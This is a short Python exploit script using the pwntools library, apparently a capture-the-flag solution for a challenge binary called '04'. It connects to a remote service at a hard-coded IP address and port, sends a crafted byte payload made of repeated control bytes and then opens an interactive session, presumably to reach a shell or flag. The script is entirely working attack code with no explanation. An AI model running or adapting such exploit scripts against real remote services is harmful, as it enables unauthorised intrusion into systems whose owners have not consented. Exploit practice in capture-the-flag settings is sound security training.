from pwn import *
context(log_level="debug")
#p = process("./04")
p = remote('128.199.220.74', 10003)
p.recvuntil("continue\n")
p.send("\n")
p.recvuntil(":")
payload = '\x07'*41+'\x08'*55+'\x02'
p.sendline(payload)
p.interactive()
